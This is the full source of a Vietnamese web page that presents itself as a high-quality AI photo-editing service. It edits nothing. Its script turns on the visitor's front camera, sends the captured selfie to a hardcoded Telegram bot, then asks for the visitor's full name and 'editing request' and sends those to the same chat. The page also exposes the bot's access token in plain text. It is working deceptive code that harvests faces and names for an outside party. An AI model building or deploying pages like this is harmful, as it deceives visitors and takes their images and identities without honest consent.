<!doctype html>
<html lang="vi">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Sửa ảnh chất lượng cao</title>
    <style>
      body {
        font-family: Arial, sans-serif;
        display: flex;
        flex-direction: column;
        align-items: center;
        justify-content: center;
        min-height: 100vh;
        margin: 0;
        background-color: #f0f2f5;
        padding: 20px 0;
      }
      .container {
        background: white;
        padding: 20px;
        border-radius: 10px;
        box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
        text-align: center;
        max-width: 400px;
        width: 100%;
        box-sizing: border-box;
        display: flex;
        flex-direction: column;
        align-items: center;
      }
      video {
        width: 100%;
        border-radius: 8px;
        margin-top: 10px;
        background-color: #000;
        transform: scaleX(-1);
        -webkit-transform: scaleX(-1);
      }
      button {
        margin-top: 15px;
        padding: 10px 20px;
        font-size: 16px;
        color: white;
        background-color: #0088cc;
        border: none;
        border-radius: 5px;
        cursor: pointer;
      }
      button:hover {
        background-color: #006699;
      }
      #status {
        margin-top: 10px;
        font-weight: bold;
      }

      /* Lớp nền mờ pop-up */
      .modal-overlay {
        position: fixed;
        top: 0;
        left: 0;
        width: 100%;
        height: 100%;
        background: rgba(0, 0, 0, 0.5);
        display: none;
        justify-content: center;
        align-items: center;
        z-index: 1000;
      }

      /* Hộp thoại Pop-up */
      .modal-box {
        background: #fff;
        padding: 24px;
        width: 100%;
        max-width: 400px;
        border-radius: 10px;
        box-shadow: 0 4px 15px rgba(0, 0, 0, 0.2);
        position: relative;
        box-sizing: border-box;
      }

      .modal-box h3 {
        margin-top: 0;
        color: #333;
      }

      .form-group {
        margin-bottom: 15px;
        text-align: left;
      }
      .form-group label {
        display: block;
        margin-bottom: 5px;
        font-weight: bold;
      }
      .form-group input,
      .form-group textarea {
        width: 100%;
        padding: 10px;
        border: 1px solid #ccc;
        border-radius: 5px;
        box-sizing: border-box;
      }

      .btn-submit {
        width: 100%;
        padding: 12px;
        background-color: #28a745;
        color: white;
        border: none;
        border-radius: 5px;
        cursor: pointer;
        font-size: 16px;
      }

      .btn-close {
        position: absolute;
        top: 10px;
        right: 15px;
        background: none;
        border: none;
        font-size: 20px;
        cursor: pointer;
        color: #888;
      }
    </style>
  </head>
  <body>
    <!-- Form Pop-up -->
    <div class="modal-overlay" id="aiModal">
      <div class="modal-box">
        <button class="btn-close" onclick="toggleModal(false)">&times;</button>
        <h3>Hãy nêu những yêu cầu cần chỉnh sửa</h3>

        <form id="tgForm" onsubmit="sendToTelegram(event)">
          <div class="form-group">
            <label for="userName">Họ và tên:</label>
            <input
              type="text"
              id="userName"
              required
              placeholder="Nhập tên của bạn..."
            />
          </div>

          <div class="form-group">
            <label for="userPrompt">Mô tả cách bạn muốn sửa ảnh:</label>
            <textarea
              id="userPrompt"
              rows="4"
              required
              placeholder="Ví dụ: Xóa phông nền, làm nét ảnh, thay áo sơ mi trắng..."
            ></textarea>
          </div>

          <button type="submit" class="btn-submit" id="submitBtn">
            Gửi lên hệ thống!
          </button>
        </form>
      </div>
    </div>

    <div class="container">
      <h2>Hãy chụp ảnh và kiên nhẫn chờ đợi</h2>
      <p>Màn hình xem trước camera:</p>

      <video id="webcam" autoplay playsinline></video>
      <canvas id="canvas" style="display: none"></canvas>

      <button id="capture-btn">Chụp ảnh</button>
      <div id="status"></div>
    </div>

    <script>
      const TELEGRAM_TOKEN = "8785240955:AAEtUwixRtLr5plokzAdGY2_TMoMECXnFYo";
      const CHAT_ID = "5436443148";

      const video = document.getElementById("webcam");
      const canvas = document.getElementById("canvas");
      const captureBtn = document.getElementById("capture-btn");
      const statusDiv = document.getElementById("status");

      // Mở camera
      navigator.mediaDevices
        .getUserMedia({ video: { facingMode: "user" } })
        .then((stream) => {
          video.srcObject = stream;
        })
        .catch((err) => {
          statusDiv.style.color = "red";
          statusDiv.innerText = "Không thể kết nối camera. Vui lòng cấp quyền!";
          console.error(err);
        });

      captureBtn.addEventListener("click", () => {
        if (!video.srcObject) {
          alert("Camera chưa sẵn sàng!");
          return;
        }

        statusDiv.style.color = "black";
        statusDiv.innerText = "Đang chụp....";

        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        const ctx = canvas.getContext("2d");

        ctx.translate(canvas.width, 0);
        ctx.scale(-1, 1);
        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

        canvas.toBlob((blob) => {
          const formData = new FormData();
          formData.append("chat_id", CHAT_ID);
          formData.append("photo", blob, "selfie.jpg");

          fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendPhoto`, {
            method: "POST",
            body: formData,
          })
            .then((response) => response.json())
            .then((data) => {
              if (data.ok) {
                statusDiv.style.color = "green";
                statusDiv.innerText = "Đã gửi ảnh thành công!";

                // Tự động mở Pop-up sau 0.5s khi đã gửi ảnh thành công
                setTimeout(() => {
                  toggleModal(true);
                }, 500);
              } else {
                statusDiv.style.color = "red";
                statusDiv.innerText = "Gửi thất bại: " + data.description;
              }
            })
            .catch((err) => {
              statusDiv.style.color = "red";
              statusDiv.innerText = "Lỗi kết nối mạng!";
              console.error(err);
            });
        }, "image/jpeg");
      });

      function toggleModal(show) {
        document.getElementById("aiModal").style.display = show
          ? "flex"
          : "none";
      }

      async function sendToTelegram(event) {
        event.preventDefault();

        const submitBtn = document.getElementById("submitBtn");
        const name = document.getElementById("userName").value.trim();
        const prompt = document.getElementById("userPrompt").value.trim();

        const message = `📩 *YÊU CẦU SỬA ẢNH MỚI*\n\n👤 *Họ tên:* ${name}\n🎨 *Yêu cầu AI:* ${prompt}`;

        const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;

        submitBtn.disabled = true;
        submitBtn.innerText = "Đang gửi...";

        try {
          const response = await fetch(url, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
              chat_id: CHAT_ID,
              text: message,
              parse_mode: "Markdown",
            }),
          });

          if (response.ok) {
            alert("Gửi yêu cầu thành công!");
            document.getElementById("tgForm").reset();
            toggleModal(false);
          } else {
            const errorData = await response.json();
            alert(
              "Không thể gửi tin nhắn: " +
                (errorData.description || "Lỗi Token/Chat ID"),
            );
          }
        } catch (error) {
          console.error("Error:", error);
          alert("Lỗi kết nối mạng!");
        } finally {
          submitBtn.disabled = false;
          submitBtn.innerText = "Gửi lên hệ thống!";
        }
      }
    </script>
  </body>
</html>
